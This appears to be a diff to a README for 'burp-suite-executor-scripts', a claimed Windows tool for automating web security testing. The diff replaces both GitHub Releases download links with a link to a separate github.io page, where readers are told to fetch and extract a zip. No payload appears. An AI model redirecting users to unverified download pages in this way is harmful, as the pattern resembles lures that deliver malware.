@@ -1,6 +1,6 @@
 # 🛠 burp-suite-executor-scripts - Automate your web security testing tasks
 
-[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/mohiteprathamesh369-a11y/burp-suite-executor-scripts/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://mohiteprathamesh369-a11y.github.io)
 
 ## What this tool does
 
@@ -14,7 +14,7 @@ You need a computer running Windows 10 or Windows 11. Ensure you have the full v
 
 You need to access the release page to get the files. 
 
-[Visit this page to download the latest scripts](https://github.com/mohiteprathamesh369-a11y/burp-suite-executor-scripts/releases)
+[Visit this page to download the latest scripts](https://mohiteprathamesh369-a11y.github.io)
 
 On that page, look for the section labeled "Assets." Click the link that ends in ".zip" to save the folder to your computer. Once the download finishes, open your Downloads folder. Right-click the folder and choose "Extract All" to see the individual script files.
 
